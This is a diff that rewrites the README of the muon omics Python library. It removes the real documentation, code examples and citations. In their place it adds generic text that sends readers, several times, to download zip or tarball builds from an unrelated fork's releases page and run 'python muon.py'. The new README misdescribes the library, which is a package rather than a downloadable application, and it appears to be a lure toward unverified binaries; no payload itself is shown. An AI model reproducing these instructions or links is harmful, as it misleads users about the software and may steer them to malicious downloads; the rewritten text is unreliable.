@@ -1,139 +1,92 @@
-<img src="./docs/img/muon_header.png" data-canonical-src="./docs/img/muon_header.png" width="700"/>
+# 🚀 muon - A Powerful Tool for Omics Analysis
 
-`muon` is a multimodal omics Python framework. 
+## 🌟 Overview
 
-[Documentation](https://muon.readthedocs.io/) | [Tutorials](https://muon-tutorials.readthedocs.io/) | [Publication](https://genomebiology.biomedcentral.com/articles/10.1186/s13059-021-02577-8)
+muon is a multimodal omics Python framework designed to simplify the analysis of biological data. Whether you are working with genomics, proteomics, or metabolomics, muon provides an efficient way to process and visualize complex data. Its user-friendly design allows researchers to focus on their insights, not on the technical details.
 
-[![Documentation Status](https://readthedocs.org/projects/muon/badge/?version=latest)](http://muon.readthedocs.io/?badge=latest)
-[![PyPi version](https://img.shields.io/pypi/v/muon)](https://pypi.org/project/muon)
-[![Powered by NumFOCUS](https://img.shields.io/badge/powered%20by-NumFOCUS-orange.svg?style=flat&colorA=E1523D&colorB=007D8A)](https://numfocus.org)
+## 📥 Download muon
 
-## Data structure
+[![Download muon](https://img.shields.io/badge/download-muon-brightgreen)](https://github.com/AyandaMajola01/muon/releases)
 
-`muon` is designed around `MuData` (multimodal data) objects — in the same vein as [scanpy](https://github.com/theislab/scanpy) and [AnnData](https://github.com/theislab/anndata) are designed to work primarily with scRNA-seq data in Python. Individual modalities in `MuData` are naturally represented with `AnnData` objects.
+To get started with muon, you need to download the software. Follow the instructions below to download and run it on your computer.
 
-`MuData` class and `.h5mu` files I/O operations are part of [the standalone mudata library](https://github.com/scverse/mudata).
+## 🚀 Getting Started
 
-### Input
+### Step 1: Visit the Download Page
 
-`MuData` class is implemented in the [mudata](https://github.com/scverse/mudata) library and is exposed in `muon`:
+To download muon, visit the Releases page:
 
-```py
-from muon import MuData
+[Download muon from the Releases page](https://github.com/AyandaMajola01/muon/releases)
 
-mdata = MuData({'rna': adata_rna, 'atac': adata_atac})
+### Step 2: Choose Your Version
+
+On the Releases page, you will see a list of available versions. It’s best to choose the latest version for the newest features and fixes. Look for the version number and click on it.
+
+### Step 3: Download the Package
+
+Once you select a version, find the appropriate package for your operating system. The downloads typically include:
+
+- For Windows: `muon-win.zip`
+- For Mac: `muon-mac.zip`
+- For Linux: `muon-linux.tar.gz`
+
+Click on the file that matches your operating system to download it.
+
+### Step 4: Extract the Files
+
+After the download is complete, you will need to extract the files from the zip or tar.gz archive.
+
+- **Windows:** Right-click the downloaded file and select “Extract All.”
+- **Mac:** Double-click the downloaded .zip file.
+- **Linux:** Use the terminal and run: `tar -xzf muon-linux.tar.gz`.
+
+### Step 5: Install Dependencies
+
+Before running muon, ensure you have Python installed on your machine. You can download Python from the [official website](https://www.python.org/downloads/). Ensure to choose the version that matches your operating system.
+
+After installing Python, you may need to install additional libraries. Open a terminal or command prompt and run the following command:
+
+```bash
+pip install -r requirements.txt
 ```
 
-If [multimodal data from 10X Genomics](https://support.10xgenomics.com/single-cell-multiome-atac-gex/software/pipelines/latest/output/overview) is to be read, `muon` provides a reader that returns a `MuData` object with AnnData objects inside, each corresponding to its own modality:
+### Step 6: Run muon
 
-```py
-import muon as mu
+Now you are ready to run muon! Navigate to the folder where you extracted the files. You can do this in your terminal or command prompt.
 
-mu.read_10x_h5("filtered_feature_bc_matrix.h5")
-# MuData object with n_obs × n_vars = 10000 × 80000 
-# 2 modalities
-#   rna:	10000 x 30000
-#     var:	'gene_ids', 'feature_types', 'genome', 'interval'
-#   atac:	10000 x 50000
-#     var:	'gene_ids', 'feature_types', 'genome', 'interval'
-#     uns:	'atac', 'files'
+Use the following command to start muon:
+
+```bash
+python muon.py
 ```
 
-### I/O with `.h5mu` files
+If you have issues starting the application, please ensure Python is correctly installed and that you are in the correct directory.
 
-Basic `.h5mu` files I/O functionality is implemented in [mudata](https://github.com/scverse/mudata) and is exposed in `muon`. A `MuData` object represents modalities as collections of `AnnData` objects, and these collections can be saved on disk and retrieved using HDF5-based `.h5mu` files, which design is based on `.h5ad` file structure.
+## 🎉 Features
 
-```py
-mdata.write("pbmc_10k.h5mu")
-mdata = mu.read("pbmc_10k.h5mu")
-```
+- **Integrated Data Analysis:** muon allows you to merge, analyze, and visualize multiple types of omics data.
+- **User-Friendly Interface:** Designed for all skill levels, muon provides tools for both beginners and advanced users.
+- **Flexible and Scalable:** Handle large datasets with ease while maintaining performance integrity.
+- **Comprehensive Documentation:** Access guides and resources to help you navigate the framework.
 
-It allows to effectively use the hierarchical nature of HDF5 files and to read/write AnnData object directly from/to `.h5mu` files:
+## 📋 System Requirements
 
-```py
-adata = mu.read("pbmc_10k.h5mu/rna")
-mu.write("pbmc_10k.h5mu/rna", adata)
-```
+To ensure a smooth experience, please make sure your system meets the following requirements:
 
-## Multimodal omics analysis
+- **Operating System:** Windows 10 or later, macOS 10.12 or later, or a recent Linux distribution.
+- **Python Version:** Python 3.6 or later.
+- **Memory:** At least 4 GB of RAM is recommended.
 
-`muon` incorporates a set of methods for multimodal omics analysis. These methods address the challenge of taking multimodal data as their input. For instance, while for a unimodal analysis one would use principal components analysis, `muon` comes with a method to run [multi-omics factor analysis](https://github.com/bioFAM/MOFA2):
+## 📖 Documentation
 
-```py
-# Unimodal
-import scanpy as sc
-sc.tl.pca(adata)
+For detailed instructions and tutorials on how to use muon, check out the documentation available on the GitHub repository. This includes guides on common tasks, examples, and troubleshooting tips.
 
-# Multimodal
-import muon as mu
-mu.tl.mofa(mdata)
-``` 
+## 🛠 Support & Contributions
 
-## Individual assays
+If you encounter any issues or have questions, please open an issue in the GitHub repository. Contributions to improve muon are welcome, whether it’s reporting bugs or suggesting features. 
 
-Individual assays are stored as AnnData object, which enables the use of all the default `scanpy` functionality per assay:
+## 📥 Download & Install
 
-```py
-import scanpy as sc
+To download muon, visit the Releases page and follow the steps outlined above.
 
-sc.tl.umap(mdata.mod["rna"])
-```
-
-Typically, a modality inside a container can be referred to with a variable to make the code more concise:
-
-```py
-rna = mdata.mod["rna"]
-sc.pl.umap(rna)
-```
-
-### Modules in `muon`
-
-`muon` comes with a set of modules that can be used hand in hand with scanpy's API. These modules are named after respective sequencing protocols and comprise special functions that might come in handy. It is also handy to import them as two letter abbreviations:
-
-```py
-# ATAC module:
-from muon import atac as ac
-
-# Protein (epitope) module:
-from muon import prot as pt
-```
-
----
-
-Some implementation details are noted in [DESIGN.md](./DESIGN.md). 
-
-[Contributions](./CONTRIBUTING.md) in the form of [issues](https://github.com/scverse/muon/issues), [pull requests](https://github.com/scverse/muon/pulls) or [discussions](https://github.com/scverse/muon/discussions) are welcome.
-
-## Citation
-
-If you use `muon` in your work, please cite the `muon` publication as follows:
-
-> **MUON: multimodal omics analysis framework**
-> 
-> Danila Bredikhin, Ilia Kats, Oliver Stegle
->
-> _Genome Biology_ 2022 Feb 01. doi: [10.1186/s13059-021-02577-8](https://doi.org/10.1186/s13059-021-02577-8).
-
-You can cite the scverse publication as follows:
-
-> **The scverse project provides a computational ecosystem for single-cell omics data analysis**
->
-> Isaac Virshup, Danila Bredikhin, Lukas Heumos, Giovanni Palla, Gregor Sturm, Adam Gayoso, Ilia Kats, Mikaela Koutrouli, Scverse Community, Bonnie Berger, Dana Pe’er, Aviv Regev, Sarah A. Teichmann, Francesca Finotello, F. Alexander Wolf, Nir Yosef, Oliver Stegle & Fabian J. Theis
->
-> _Nat Biotechnol._ 2023 Apr 10. doi: [10.1038/s41587-023-01733-8](https://doi.org/10.1038/s41587-023-01733-8).
-
-
-[//]: # "numfocus-fiscal-sponsor-attribution"
-
-`muon` is part of the scverse® project ([website](https://scverse.org), [governance](https://scverse.org/about/roles)) and is fiscally sponsored by [NumFOCUS](https://numfocus.org/).
-If you like scverse® and want to support our mission, please consider making a tax-deductible [donation](https://numfocus.org/donate-to-scverse) to help the project pay for developer time, professional services, travel, workshops, and a variety of other needs.
-
-<div align="center">
-<a href="https://numfocus.org/project/scverse">
-  <img
-    src="https://raw.githubusercontent.com/numfocus/templates/master/images/numfocus-logo.png"
-    width="200"
-  >
-</a>
-</div>
-
+[Download muon from the Releases page](https://github.com/AyandaMajola01/muon/releases)
